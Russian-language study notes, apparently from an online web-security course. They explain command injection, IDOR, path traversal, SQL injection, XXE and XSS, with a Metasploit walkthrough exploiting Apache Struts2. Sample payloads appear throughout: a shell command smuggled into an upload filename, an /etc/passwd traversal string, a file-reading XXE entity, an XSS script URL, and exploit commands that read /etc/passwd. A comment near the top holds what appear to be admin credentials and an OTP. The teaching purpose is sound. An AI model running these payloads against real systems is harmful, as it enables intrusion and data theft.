OSINT - Методика исследования, которая использует общедоступные источники информации для получения данных о конкретной цели или объекте
nmap - инструмент для сканирования сетей и определения активных устройств и открытых портов
Masscan, Zenmap, Nessus - сканеры сетей
m.sppcm.ru - домен 3 уровня

<!-- admin
q1w2e3r4

https://stepik.org/lesson/945911/step/3?unit=952150
5.2 Уязвимости обхода аутентификации

OTP
059 -->

Инъекция команд ОС (также известная как shell инъекция) является уязвимостью веб-приложений, которая позволяет злоумышленнику выполнять произвольные команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, дает возможность полностью скомпрометировать приложение и все его данные. Очень часто злоумышленник может использовать уязвимость внедрения команд ОС для компрометации других частей инфраструктуры, используя доверительные отношения для перенаправления атаки на другие системы в организации.

# 5.3

Как возникают уязвимости инъекции команд?
Пример допущенной уязвимости инъекции команд:

$command = 'convert -pointsize 72 label:Hello ' . $_FILES['userfile']['name'];
 system($command);
В примере выше имя файла попадает прямо в строку исполнения, которая в последствии будет выполнена терминальной оболочкой. Это позволяет дописать дополнительные команды терминальной оболочки и воспользоваться этим недостатком.

Пример эксплуатации для уязвимости выше:

------WebKitFormBoundaryePkpFF7tjBAqx29L
Content-Disposition: form-data; name="userfile"; filename="check | ls -la;"
Content-Type: application/x-object

... contents of file goes here ...
Зачастую эксплуатация подобного рода уязвимостей затруднена и требует поиска возможностей выполнения кода через другие “контексты” и технологии.

Например, выполнение команд возможно в ряде других уязвимостей, которые, прежде чем получить возможность выполнить произвольную команду, надо найти и проэксплуатировать.

К подобным уязвимостям относятся:
Уязвимости небезопасной десериализации
Уязвимости внедрения шаблонов на стороне сервера SSTI
Уязвимости SQL инъекции
Уязвимости переполнения буфера / кучи / стека
Множественные случаи проблем и ошибок реализации, возникающих при работе с запуском процессов и работе с терминальной оболочкой

# 5/4

Что такое контроль доступа?

В контексте веб-приложений контроль доступа зависит от аутентификации и управления сеансами:

Аутентификация идентифицирует пользователя и подтверждает, что он является тем, за кого себя выдает.
Управление сеансом идентифицирует, какие последующие HTTP-запросы выполняются тем же самым пользователем.
Управление доступом определяет, разрешено ли пользователю выполнять действия, которые он пытается выполнить.
Сломанный контроль доступа является часто встречающейся и часто критической уязвимостью безопасности. Проектирование и управление контролем доступа — это сложная и динамичная проблема, которая применяет деловые, организационные и правовые ограничения к технической реализации. Проектные решения по контролю доступа должны приниматься людьми, а не технологиями, и вероятность ошибок высока.

# Категории контроля доступа

С точки зрения пользователя, контроль доступа можно разделить на следующие категории:

Вертикальный контроль доступа.
Горизонтальный контроль доступа.
Контекстно-зависимый контроль доступа.
Вертикальный контроль доступа
Вертикальный контроль доступа — это механизмы, ограничивающие доступ к чувствительным функциям, недоступным другим типам пользователей. С помощью вертикальных средств контроля доступа различные типы пользователей имеют доступ к различным функциям приложений. Например, администратор может изменить или удалить учетную запись любого пользователя, в то время как обычный пользователь не имеет доступа к этим действиям. Вертикальные средства контроля доступа могут быть более тонкой реализацией моделей безопасности, разработанных для внедрения бизнес-политик, таких, как разделение обязанностей и наименьших привилегий.

Пример уязвимостей IFLAC
Insecure Function Level Access Control (IFLAC) — это подкатегория уязвимостей контроля доступа. Уязвимый контроль доступа функционального уровня может позволить злоумышленникам получить доступ к несанкционированным для роли злоумышленника функциям. Административные функции являются основной целью данного типа атак.

Данная уязвимость возникает, когда приложение публикует функциональный интерфейс (например, API), в котором не проверяется уровень доступа для обращения к определенным в интерфейсе функциям. В таком случае злоумышленник может вызывать функции приложения, которые дают ему привилегии, не задуманные для использования уровнем роли злоумышленника.

Примером может послужить возможность обращения к вызову функции удаления пользователя, в то время как доступ в административную панель для низкопривилегированного пользователя формально закрыт. Т.е. пользователь не может открыть кабинет администратора, но может выполнить запрос к методу API, который будет успешно выполнен.

# Горизонтальный контроль доступа

Горизонтальный контроль доступа — это механизмы, ограничивающие доступ к ресурсам для пользователей, которым специально разрешен доступ к этим ресурсам.

С помощью горизонтального контроля доступа различные пользователи имеют доступ к подмножеству ресурсов одного и того же типа. Например, банковское приложение позволит пользователю просматривать транзакции и осуществлять платежи со своих счетов, но не со счетов любого другого пользователя.

Пример уязвимостей IDOR
Небезопасные прямые ссылки на объекты (IDOR) — это также подкатегория уязвимостей контроля доступа. IDOR возникает, когда приложение использует пользовательский ввод для прямого доступа к объектам, а злоумышленник может модифицировать ввод для получения несанкционированного доступа. Он был популярен своим появлением в OWASP TOP 10 2007, хотя это лишь один из примеров многих ошибок в реализации, которые могут привести к обходу контроля доступа.

Рассмотрим сайт, который использует следующий URL для доступа к странице учетной записи клиента, извлекая информацию из внутренней базы данных:
https://insecure-website.com/customer_account?customer_number=132355

Здесь номер клиента используется непосредственно как индекс записи в запросах, которые выполняются на внутренней базе данных. Если другие элементы управления отсутствуют, злоумышленник может просто изменить значение параметра customer_number, минуя элементы управления доступом для просмотра записей других клиентов. Это пример уязвимости IDOR, приводящей к горизонтальному повышению привилегий.

Атакующий может выполнить горизонтальное и вертикальное повышение привилегий, изменяя пользователя на пользователя с дополнительными привилегиями в обход элементов управления доступом. Другие возможности включают в себя, например, использование утечки пароля или изменение параметров после того, как злоумышленник попал на страницу учетной записи пользователя.

# Контроль доступа в местах, зависящих от бизнес-логики

Контекстно-зависимые элементы управления доступом ограничивают доступ к функциональности и ресурсам в зависимости от состояния приложения или взаимодействия с ним пользователя, а также препятствуют выполнению пользователем действий в неправильном порядке. Например, веб-сайт розничной торговли может помешать пользователю изменить содержимое корзины после того, как он произвел оплату.

Как исключать возникновение уязвимостей контроля доступа?
Уязвимости контроля доступа, как правило, можно предотвратить, применяя глубокий подход к защите и следуя следующим принципам:

Никогда не полагайтесь только на обфускацию для контроля доступа.
Если ресурс не предназначен для публичного доступа, запретите доступ по умолчанию.
Где это возможно, используйте единый прикладной механизм для обеспечения контроля доступа.
На уровне кода сделайте обязательным для разработчиков объявление доступа, разрешенного для каждого ресурса, и запретите доступ по умолчанию.
Тщательно проверяйте и тестируйте средства контроля доступа, чтобы убедиться, что они работают так, как задумано.
Регистрируйте сбои контроля доступа и уведомляйте администраторов при необходимости (например, если сбои повторяются).
Ограничивайте частоту доступа к API и контроллерам для минимизации ущерба от инструментов автоматизации атак.

# 5.5

Уязвимости разграничения доступа к каталогам
Манипуляция путем к каталогам (также известный как обход файловых путей, англ. Path Traversal или Directory Traversal) – это уязвимость веб-безопасности, позволяющая злоумышленнику читать произвольные файлы на сервере, на котором запущено приложение. Сюда могут входить код приложения и данные, учетные данные для внутренних систем и конфиденциальные файлы операционной системы. В некоторых случаях злоумышленник может записать в произвольные файлы на сервере, что позволит ему изменить данные или поведение приложения, и, в конечном счете, получить полный контроль над сервером.

Почему такие уязвимости появляются?
Уязвимости Directory Traversal появляются из-за отсутствия валидации входных данных пользователя, а также из-за отсутствия разграничения доступа приложения или функции на возможность обращаться к файловым ресурсам всего сервера.

Пример уязвимого кода:

<?php
$template = 'red.php';
if (isset($_COOKIE['TEMPLATE'])) {
    $template = $_COOKIE['TEMPLATE'];
}
include "/home/users/phpguru/templates/" . $template;

В данном примере мы видим, что функция include подключает файлы из директории /home/users/phpguru/templates/ , имена которых отправил пользователь в своих Cookie данных на сервер. В таком случае пользователь может изменить отправляемые им данные и добавить в данные отправляемые на сервер строку ../../../../../etc/passwd .  В таком случае, сервер выполнит запрос к файлу по адресу /home/users/phpguru/templates/../../../../../etc/passwd , что в конечном итоге превратиться в обращение к файлу /etc/passwd, и предоставит возможность чтения пользователю системных файлов ОС, к которым он не должен был иметь доступа.

# 5.6
Уязвимости SQL-инъекции
Что такое SQL?

Язык структурированных запросов (SQL) – это язык программирования для хранения и обработки информации в реляционной базе данных. Реляционная база данных хранит информацию в табличной форме со строками и столбцами, представляющими различные атрибуты данных и различные связи между значениями данных. Инструкции SQL можно использовать для хранения, обновления, удаления, поиска и извлечения информации из базы данных. Можно также использовать SQL для поддержания и оптимизации производительности базы данных.

Что такое SQL инъекция?
SQL-инъекция – это уязвимость веб-приложений, позволяющая злоумышленнику вмешиваться в запросы, которые приложение делает к своей базе данных. Она позволяет злоумышленнику просматривать данные, которые он, как правило, не может получить. Сюда могут входить данные, принадлежащие другим пользователям, или любые другие данные, к которым само приложение может получить доступ. Во многих случаях злоумышленник может изменять или удалять эти данные, вызывая постоянные изменения содержимого или поведения приложения.

В некоторых ситуациях злоумышленник может эскалировать атаку SQL-инъекции, чтобы скомпрометировать сервер или другую внутреннюю инфраструктуру, или выполнить атаку типа "отказа в обслуживании".

Какой ущерб несут уязвимости к инъекции SQL?
Успешная атака SQL-инъекции может привести к несанкционированному доступу к конфиденциальным данным, таким, как пароли, данные кредитной карты или личная информация пользователя. Многие громкие утечки данных в последние годы стали результатом атак SQL-инъекции, что привело к репутационному ущербу и штрафам со стороны регулирующих органов. В некоторых случаях злоумышленник может получить постоянный «черный ход» в системы организации, что приводит к долгосрочному закреплению злоумышленника в инфраструктуре, которое может оставаться незамеченным длительный
период времени.

В частности, уязвимости SQL-инъекций могут приводить к:

Извлечению данных и возможности исследования базы данных
Модификации информации в базе данных (удалению, добавлению, изменению)
Обходу логики
Обходу механизмов авторизации и аутентификации
Чтению файлов ОС
Выполнению команд ОС
Отказу в обслуживании

# 5/6
О техниках атак
Существует широкий спектр уязвимостей, атак и методов SQL инъекции, которые возникают в различных ситуациях. К числу наиболее распространенных примеров SQL-инъекций относятся:

Stacked queries — инъекция SQL-запросов, позволяющая злоумышленнику выполнить несколько запросов за один раз.

Union-based — инъекция, использующая оператор UNION для объединения результатов двух запросов, что позволяет злоумышленнику извлекать данные из других таблиц.

Error-based — инъекция, основанная на ошибке, которая может возникнуть при выполнении запроса, что позволяет злоумышленнику получать информацию об уязвимости.

Boolean blind — инъекция, при которой злоумышленник использует булевы выражения для проверки наличия или отсутствия определенных данных в базе данных.

Time-based — инъекция, которая использует задержку выполнения запроса для получения информации о базе данных.

Out of band — инъекция, которая не взаимодействует с сайтом напрямую, а использует другой канал для передачи данных, например, отправку электронной почты или HTTP-запросов.

# 5.7
Уязвимости внедрения внешних сущностей XML
Что такое XML?

Расширяемый язык разметки (Extensible Markup Language, XML) позволяет определять и хранить данные совместно используемым способом. XML поддерживает обмен информацией между компьютерными системами, такими, как веб-сайты, базы данных и сторонние приложения. Предопределенные правила упрощают передачу данных в виде XML-файлов по любой сети, поскольку получатель может использовать эти правила для точного и эффективного чтения данных.

Что это такое XXE инъекция?

Инъекция внешних сущностей XML (также известная как XML External Entity, XXE) – это уязвимость веб-безопасности, позволяющая злоумышленнику вмешиваться в обработку XML-данных приложения. Часто она позволяет злоумышленнику просматривать файлы на файловой системе сервера приложений, а также взаимодействовать с любыми внутренними или внешними системами, к которым имеет доступ само приложение.

Почему такие уязвимости появляются?
Некоторые приложения используют формат XML для передачи данных между браузером и сервером. Приложения, которые делают это, практически всегда используют стандартную библиотеку или платформенный API для обработки XML-данных на сервере.

Уязвимости XXE возникают из-за того, что спецификация XML содержит различные потенциально опасные функции, и стандартные парсеры поддерживают эти функции, даже если они обычно не используются приложением.


 <!DOCTYPE order [<!ENTITY file SYSTEM "file:///var/www/secret">]>

 К чему такие уязвимости могут привести?
Атаки инъекции XXE позволяют провести множество различных вариаций векторов атак, например:

Использование XXE для получения файлов, где определяется внешняя сущность, содержащая содержимое файла, и возвращается в ответе приложения.
Использование XXE для выполнения SSRF атак, где внешняя сущность определяется на основе URL на внутреннюю систему.
Использование слепой инъекции XXE с отправкой данных за рамки клиент-серверного приложения, где конфиденциальные данные передаются с сервера приложения на систему, контролируемую злоумышленником.
Использование слепого XXE для получения данных с помощью сообщений об ошибках, где злоумышленник может вызвать сообщение об ошибке разбора, содержащее конфиденциальные данные.
Использование XXE для проведения атак отказа в обслуживании (англ. Distributed Denialof Service (DDoS)).

# 5/8
Атаки межсайтового скриптинга (XSS)
Межсайтовый скриптинг (также известный как Cross-Site Scripting, XSS) – это уязвимость веб-безопасности, позволяющая злоумышленнику компрометировать взаимодействие пользователей с уязвимым приложением. Она позволяет злоумышленнику обходить политику одного источника (Same Origin Policy, SOP), которая предназначена для разделения различных веб сайтов друг от друга.

Как работает XSS?
Уязвимости межсайтового скриптинга, как правило, позволяют злоумышленнику маскироваться под пользователя-жертву, выполнять любые действия, которые может выполнить пользователь, и получать доступ к любым данным пользователя.

Если пользователь-жертва имеет привилегированный доступ внутри приложения, то атакующий может получить полный контроль над всей функциональностью и данными приложения.

Межсайтовый скриптинг работает путем манипулирования уязвимым веб-сайтом, чтобы он возвращал пользователям вредоносный JavaScript. Когда вредоносный код выполняется внутри браузера жертвы, злоумышленник может полностью скомпрометировать их взаимодействие с приложением.

Типы XSS-атак
Существует три основных типа XSS-атак:

Отраженный XSS, где вредоносный скрипт происходит из текущего HTTP запроса.
Хранимый XSS, где вредоносный скрипт приходит из хранилища данных веб-сайта.
Dom-based XSS, где уязвимость существует в клиентском коде, а не в коде сервера.
Отраженный XSS
Отраженный межсайтовый скриптинг (XSS) возникает, когда приложение получает данные в HTTP-запросе и включает эти данные непосредственно в ответ небезопасным способом.

Предположим, что веб-сайт имеет функцию поиска, которая получает пользовательское поисковое слово в параметре URL:  https://insecure-website.com/search?term=gift 

В ответе на этот URL приложение отвечает с заданным поисковым термином:


Предполагая, что приложение не выполняет никакой другой обработки данных, атакующий может построить следующий вектор атаки:
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>.

Если другой пользователь приложения сделает запрос по URL злоумышленника, то скрипт, предоставленный злоумышленником, будет выполнен в браузере пользователя-жертвы, в контексте его сеанса работы с приложением.

Хранимый XSS
Сохраненный межсайтовый скриптинг (скриптинг второго порядка или постоянный XSS) возникает, когда приложение получает данные из недоверенного источника и включает эти данные в свои последующие HTTP-ответы небезопасным способом.

Предположим, что веб-сайт позволяет пользователям оставлять комментарии к записям в блогах, которые отображаются другим пользователям. Пользователи отправляют комментарии, используя HTTP-запрос как показано ниже:



После того, как этот комментарий будет отправлен, любой пользователь, посетивший пост в блоге, получит следующий комментарий в рамках ответа приложения:



Если предположить, что приложение не выполняет никакой другой обработки данных, злоумышленник может отправить такой вредоносный комментарий:



В запросе злоумышленника этот комментарий будет иметь URL-адрес, как:



Любой пользователь, посетивший пост в блоге, теперь получит следующий ответ в рамках ответа приложения:



Скрипт, предоставленный злоумышленником, будет затем выполнен в браузере пользователя-жертвы в контексте его сеанса работы с приложением.

Dom-based XSS

XSS-уязвимости, основанные на DOM, обычно возникают, когда JavaScript берет данные из подконтрольного злоумышленнику источника, например, URL, и передает их «раковине» (англ. sink), поддерживающей динамическое выполнение кода, например, eval() или innerHTML. Это позволяет злоумышленникам выполнять вредоносный JavaScript, что обычно приводит к взлому учетных записей других пользователей.

Для реализации XSS-атаки, основанной на DOM, необходимо поместить данные в источник таким образом, чтобы они распространились на поглотитель и вызвали выполнение произвольного JavaScript.

<!-- docker-compose restart bot -->

<!-- Самый простой и эффективный способ предотвратить XXE-атаки - Отключить поддержку External Entity в библиотеке парсера XML-файла -->

# 6/1
Основные понятия
Эксплоит (англ. exploit, эксплуатировать) — компьютерная программа, фрагмент программного кода или последовательность команд, использующие уязвимости в программном обеспечении и применяемые для проведения атаки на вычислительную систему. 

Нагрузка (англ. payload, Поле́зная нагру́зка) — часть эксплойта, которая производит деструктивные действия с данными, копирование информации с компьютера и т.д.

Фреймворк эксплуатации — платформа для создания и отладки эксплойтов. Кроме того, включает в себя базу опкодов, архив шеллкодов и информацию по исследованиям информационной безопасности.

Уязвимость нулевого дня — термин, обозначающий неустранённые уязвимости, а также вредоносные программы, против которых ещё не разработаны защитные механизмы.


# 6 Test
Разбор базового примера
Уязвимость, которая может быть найдена в публичном сетевом сервисе заказчика
Ход действий

1. Проведем сканирование узла evil.corp, используя Nmap: отключим ping-сканирование с помощью опции -Pn, выведем только открытые порты с помощью опции --open и определим версии сервисом с помощью опции -sV:


$ nmap -sT -Pn -p 21,22,23,80,445 -sV --open -v evil.corp
2. Видим в выводе порт 8080 с http-сервисом. Откроем его в браузере.

3. Изучим это приложение, определим, что это Struts 2 с стандартной страницей showcase, демонстрирующей возможности этого фреймворка. Попытаемся найти известные уязвимости для этого сервиса с помощью Metasploit Framework:

$ msfconsole

msf6> search apache struts2 showcase

4. Воспользуемся эксплойтом:

msf6> exploit/multi/http/struts2_code_exec_showcase

5. Изучим эксплойт и его настройки:

msf6> info

msf6> options

7. Настроим эксплойт:
msf6> set RHOSTS evil.corp

8. С помощью браузера подберем значение для опции TARGETURI; так как стандартный путь не работает – проверим TARGETURI /integration/saveGangster.action и убедимся, что он работает:

msf6> set TARGETURI /integration/saveGangster.action

9. Подготовим полезную нагрузку для выполнения произвольных команд:

msf6> set PAYLOAD cmd/unix/generic

msf6> set CMD id

10. Запустим эксплойт и убедимся, что у нас есть права root:

msf6> run

11. Поменяем команду:

msf6> set CMD cat /etc/passwd

msf6> run


# Уязвимости 0-го дня
Обычно поиск уязвимостей 0-го дня производят энтузиасты, которые в дальнейшем сообщают о найденных уязвимостях производителям, чтобы те исправили проблемы безопасности.

Среди них можно выделить:

Пентестеров
Исследователей
Что может помочь в поиске?
Анализ исходных кодов
Динамический анализ
Фаззинг тестирование
Известные случаи утечек уязвимостей 0-го дня:
EternalBlue — это компьютерный эксплойт, разработанный Агентством национальной безопасности США (АНБ). Утечка информации о нем была осуществлена хакерской группой Shadow Brokers 14 апреля 2017 года, через месяц после того, как Microsoft выпустила патчи для этой уязвимости.

Примеры исследований уязвимостей нулевого дня в публичных библиотеках:
https://imagetragick.com/ — ImageMagick, пакете, обычно используемом веб-службами для обработки изображений, в 2016 году обнаружено множество уязвимостей. Многие из уязвимостей могут привести к удаленному выполнению кода (RCE) при обработке изображений, отправленных пользователем. 

https://github.com/neex/phuip-fpizdam — это эксплойт для ошибки в php-fpm (CVE-2019-11043). В определенных конфигурациях nginx + php-fpm ошибка может быть вызвана извне. Это означает, что веб-пользователь может получить выполнение кода, если у вас уязвимая конфигурация.

<!-- docker run -it --rm -p 1337:8080 --name struts piesecurity/apache-struts2-cve-2017-5638 -->
